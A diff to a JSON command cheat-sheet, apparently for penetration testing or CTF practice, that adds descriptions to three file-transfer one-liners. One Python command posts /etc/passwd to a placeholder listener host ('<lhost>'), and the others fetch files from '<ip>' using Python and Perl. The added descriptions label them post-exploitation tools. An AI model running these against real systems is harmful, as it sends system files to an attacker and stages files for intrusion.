@@ -60,15 +60,18 @@
   "variations": [
     {
       "label": "Python upload (requests)",
-      "command": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'"
+      "command": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
+      "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
     },
     {
       "label": "Python read a served file",
-      "command": "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://<ip>/flag.txt').read().decode())\""
+      "command": "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://<ip>/flag.txt').read().decode())\"",
+      "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
     },
     {
       "label": "Perl download (HTTP::Tiny)",
-      "command": "perl -e 'use HTTP::Tiny; my $r=HTTP::Tiny->new->get(\"http://<ip>:8000/test.txt\"); open(F,\">perl_test.txt\"); print F $r->{content}; close(F);'"
+      "command": "perl -e 'use HTTP::Tiny; my $r=HTTP::Tiny->new->get(\"http://<ip>:8000/test.txt\"); open(F,\">perl_test.txt\"); print F $r->{content}; close(F);'",
+      "description": "Perl download (HTTP::Tiny). See the command syntax for exact parameters and flags."
     }
   ],
   "opsec": "quiet",
